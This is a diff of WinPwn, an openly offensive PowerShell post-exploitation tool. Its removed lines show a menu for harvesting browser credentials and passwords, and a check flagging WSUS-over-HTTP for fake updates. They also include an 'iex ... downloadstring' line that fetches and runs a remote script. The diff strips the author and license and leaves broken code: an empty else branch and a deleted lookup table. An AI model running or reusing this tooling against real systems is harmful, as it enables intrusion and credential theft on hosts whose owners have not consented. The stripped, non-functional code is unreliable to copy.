@@ -207,7 +207,6 @@ function Kittielocal
         return
     }
       
-
 function testtemp
 {
  if(!(Test-Path -Path C:\temp\))
@@ -221,10 +220,7 @@ function testtemp
 function Localreconmodules
 {
 <#
-        .DESCRIPTION
-        All local recon scripts are executed here.
-        Author: @S3cur3Th1sSh1t
-        License: BSD 3-Clause
+        
     #>
     #Local Reconning
     [CmdletBinding()]
@@ -241,14 +237,6 @@ function Localreconmodules
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     @'
 
-             
-__        ___       ____                 
-\ \      / (_)_ __ |  _ \__      ___ __  
- \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
-  \ V  V / | | | | |  __/ \ V  V /| | | |
-   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
-
-   --> Localreconmodules
 
 '@
     if ($noninteractive -and (!$consoleoutput))
@@ -275,18 +263,7 @@ __        ___       ____
     
     do
     {
-        Write-Host "================ WinPwn ================"
-        Write-Host -ForegroundColor Green '1. Collect general computer informations, this will take some time!'
-        Write-Host -ForegroundColor Green '2. Check Powershell event logs for credentials or other sensitive information! '
-        Write-Host -ForegroundColor Green '3. Collect Browser credentials as well as the history! '
-        Write-Host -ForegroundColor Green '4. Search for .NET Service-Binaries on this system! '
-        Write-Host -ForegroundColor Green '5. Search for Passwords on this system using passhunt.exe!'
-        Write-Host -ForegroundColor Green '6. Start SessionGopher! '
-        Write-Host -ForegroundColor Green '7. Search for sensitive files on this local system (config files, rdp files, password files and more)! '
-        Write-Host -ForegroundColor Green '8. Execute PSRecon or Get-ComputerDetails (powersploit)! '
-        Write-Host -ForegroundColor Green '9. Search for any .NET binary file in a share! '
-        Write-Host -ForegroundColor Green '10. Go back '
-        Write-Host "================ WinPwn ================"
+        
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
         Switch ($masterquestion) 
@@ -315,46 +292,9 @@ function Generalrecon{
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
 
-    Write-Host -ForegroundColor Yellow 'Starting local Recon phase:'
-    #Check for WSUS Updates over HTTP
-	Write-Host -ForegroundColor Yellow 'Checking for WSUS over http'
-    $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
-    $WUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name WUServer -ErrorAction SilentlyContinue).WUServer
-
-    if($UseWUServer -eq 1 -and $WUServer.ToLower().StartsWith("http://")) 
-	{
-        Write-Host -ForegroundColor Yellow 'WSUS Server over HTTP detected, most likely all hosts in this domain can get fake-Updates!'
-	    if(!$consoleoutput){echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer " >> "$currentPath\Vulnerabilities\WsusoverHTTP.txt"}else{echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer "}
-    }
-
-    #Check for SMB Signing
-    Write-Host -ForegroundColor Yellow 'Check SMB-Signing for the local system'
-    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-SMBNegotiate.ps1')
-    if(!$consoleoutput){Invoke-SMBNegotiate -ComputerName localhost >> "$currentPath\Vulnerabilities\SMBSigningState.txt"}else{Write-Host -ForegroundColor red "SMB Signing State: ";Invoke-SMBNegotiate -ComputerName localhost}
-
-
-    #Check .NET Framework versions in use
-    $Lookup = @{
-    378389 = [version]'4.5'
-    378675 = [version]'4.5.1'
-    378758 = [version]'4.5.1'
-    379893 = [version]'4.5.2'
-    393295 = [version]'4.6'
-    393297 = [version]'4.6'
-    394254 = [version]'4.6.1'
-    394271 = [version]'4.6.1'
-    394802 = [version]'4.6.2'
-    394806 = [version]'4.6.2'
-    460798 = [version]'4.7'
-    460805 = [version]'4.7'
-    461308 = [version]'4.7.1'
-    461310 = [version]'4.7.1'
-    461808 = [version]'4.7.2'
-    461814 = [version]'4.7.2'
-    528040 = [version]'4.8'
-    528049 = [version]'4.8'
-    }
-
+    
+    
+    
     $Versions = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse |
   Get-ItemProperty -name Version, Release -EA 0 |
   Where-Object { $_.PSChildName -match '^(?!S)\p{L}'} |
@@ -366,9 +306,7 @@ function Generalrecon{
         $Versions >> "$currentPath\LocalRecon\NetFrameworkVersionsInstalled.txt"
     }
     else
-    {
-        $Versions
-    }
+    
 
     #Collecting usefull Informations
     if(!$consoleoutput){
